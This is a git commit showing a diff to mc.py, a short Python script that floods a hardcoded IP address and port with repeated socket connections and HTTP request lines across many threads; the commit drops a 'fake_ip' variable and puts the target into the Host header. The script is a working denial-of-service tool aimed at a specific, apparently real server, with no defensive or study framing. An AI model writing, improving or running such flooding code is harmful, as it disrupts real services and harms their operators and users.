24a0e0bb0ff76eca19727c14937919b74c96baf4
Biasstudents <139652035+Biasstudents@users.noreply.github.com>
2023-07-19 23:07:21 +0600

    Update mc.py

--- mc.py
+++ mc.py
@@ -3,14 +3,13 @@ import threading
 
 target = '185.107.194.87'
 port = 60184
-fake_ip = '185.107.194.87'
 
 def attack():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target, port))
         s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
         s.close()
 
 for i in range(500):
